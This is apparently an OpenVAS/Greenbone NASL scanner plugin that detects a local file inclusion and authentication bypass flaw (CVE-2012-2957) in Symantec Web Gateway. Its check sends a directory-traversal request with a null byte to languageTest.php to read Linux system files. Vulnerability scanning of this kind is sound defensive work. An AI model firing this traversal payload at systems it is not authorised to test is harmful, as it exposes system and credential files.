CPE = "cpe:/a:symantec:web_gateway";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103523" );
	script_bugtraq_id( 54429 );
	script_cve_id( "CVE-2012-2957" );
	script_tag( name: "cvss_base", value: "7.2" );
	script_tag( name: "cvss_base_vector", value: "AV:L/AC:L/Au:N/C:C/I:C/A:C" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Symantec Web Gateway Local File Manipulation Authentication Bypass Vulnerability" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-07-24 10:16:58 +0200 (Tue, 24 Jul 2012)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_symantec_web_gateway_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "symantec_web_gateway/installed" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/54429" );
	script_tag( name: "solution", value: "Vendor updates are available. Please see the references for more
  information." );
	script_tag( name: "summary", value: "Symantec Web Gateway is prone to a local authentication-bypass
  vulnerability" );
	script_tag( name: "impact", value: "A attacker can exploit this issue by manipulating certain local files to bypass
  authentication and gain unauthorized privileged access to the application. Successful exploits may lead to other attacks." );
	script_tag( name: "affected", value: "Symantec Web Gateway versions 5.0.x.x are vulnerable." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files( "Linux" );
for pattern in keys( files ) {
	file = files[pattern];
	url = dir + "/spywall/languageTest.php?&language=" + crap( data: "../", length: 6 * 9 ) + file + "%00";
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

